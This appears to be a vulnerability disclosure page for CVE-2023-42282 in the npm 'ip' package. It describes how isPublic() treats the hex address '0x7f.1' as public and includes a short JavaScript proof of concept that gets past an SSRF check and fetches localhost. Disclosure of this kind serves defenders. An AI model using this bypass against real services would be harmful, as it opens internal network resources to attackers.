
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Missing IP Address Control in isPublic() Function Leads to SSRF Bypass PoC</title>
    <style>
        /* Arka plan rengi */
        code {
            background-color: #f4f4f4;
            padding: 10px;
            display: block;
        }
    </style>
</head>
<body>
<h1>Missing IP Address Control in isPublic() Function Leads to SSRF Bypass PoC</h1>
<pre>
<b><Software: https://www.npmjs.com/package/ip</b>
<b>Version: <= 1.1.8(Latest)</b>
<b>Fixed Version: None </b>
<b>CVE ID: CVE-2023-42282</b>
<b>Vulnerability Type: Security Misconfiguration</b>

    

<b>Vulnerabilty: Missing IP Address Control in isPublic() Function Leads to SSRF Bypass</b>
<h3>Description of the product:</h3>
IP address utilities for node.js
Get your ip address, compare ip addresses, validate ip addresses, etc.
<h3>Description of the vulnerability:</h3>
In the code snippet of library, a security vulnerability arises due to the ip.isPublic function's incorrect identification of the IP address 0x7f.1 as public.</br>
This address is actually a hexadecimal representation of the private IP 127.0.0.1. </br>
This misclassification can lead to potential Server-Side Request Forgery (SSRF) attacks, as the code may unintentionally permit HTTP requests to internal network resources, creating a significant security risk.</br> 
The core issue is the function's failure to accurately distinguish between public and private IP addresses.</br>
</pre>
<h1>PoC</h1>
 <code>
        <br>var ip = require('ip');</br>
        <br>console.log(ip.isPublic("0x7f.1")); // true</br>
        <br>// Check IP and IF IP is not public do HTTP req ==> SSRF</br>
        <br>var my_ip = "0x7f.1"; // private but ip package doesn't recognize as private!</br>
        <br>// var my_ip2 = "google.com"; // public --> fetch will be completed</br>
        <br>// var my_ip3 = "127.0.0.1"; // private --> else statement will be run</br>
        <br>if (ip.isPublic(my_ip)) {</br>
            <br>fetch("http://" + my_ip).then((response) => {</br>
                <br>console.log(response);</br>
            <br>});</br>
        <br>} else {</br>
            <br>console.log("IP is not public");</br>
        <br>}</br>
 </code>
</body>
</html>
